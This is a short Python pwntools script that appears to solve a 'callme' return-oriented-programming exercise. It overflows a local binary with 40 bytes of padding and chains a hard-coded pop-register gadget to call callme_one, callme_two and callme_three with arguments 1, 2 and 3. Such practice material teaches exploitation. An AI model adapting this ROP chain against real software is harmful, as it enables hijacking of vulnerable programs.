from pwn import *

b = ELF("./callme")

pop_rsi_rdi_rdx = p64(0x0000000000401ab0)
ret = p64(0x00000000004017d9)
args = p64(1) + p64(2) + p64(3)

call_one   = p64(b.symbols['callme_one'])
call_two   = p64(b.symbols['callme_two'])
call_three = p64(b.symbols['callme_three'])

padding = "A"*40

payload = [
    padding,
    pop_rsi_rdi_rdx,
    args,
    call_one,
    ret,
    pop_rsi_rdi_rdx,
    args,
    call_two,
    ret,
    pop_rsi_rdi_rdx,
    args,
    call_three
]


foo = ''.join(payload)

p = process('./callme')

p.recvuntil("> ")
p.sendline(foo)
print p.recv()
